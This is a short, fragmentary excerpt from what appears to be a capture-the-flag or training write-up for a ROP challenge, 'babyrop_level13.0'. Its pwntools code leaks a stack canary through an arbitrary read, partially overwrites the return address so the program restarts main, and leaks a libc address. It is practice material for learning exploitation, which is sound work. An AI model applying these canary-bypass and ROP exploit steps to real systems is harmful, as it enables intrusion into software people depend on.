...
2. Using STACK_ADDR (INPUT_ADDR + 40 = CANARY on STACK) LEAK we further leaked CANARY with Arbitrary read to bypass CANARY PROTECTION.
...
p = process("./babyrop_level13.0", env={})
...
payload += b"\x4e" + b"\x3c"  # to restart and goto main()
...
print(p.recvuntil(b"Address in hex to read from:\n"))
p.sendline(hex(input_buff + 56).encode())  # leak libc_start_call_main i.e ret_addr
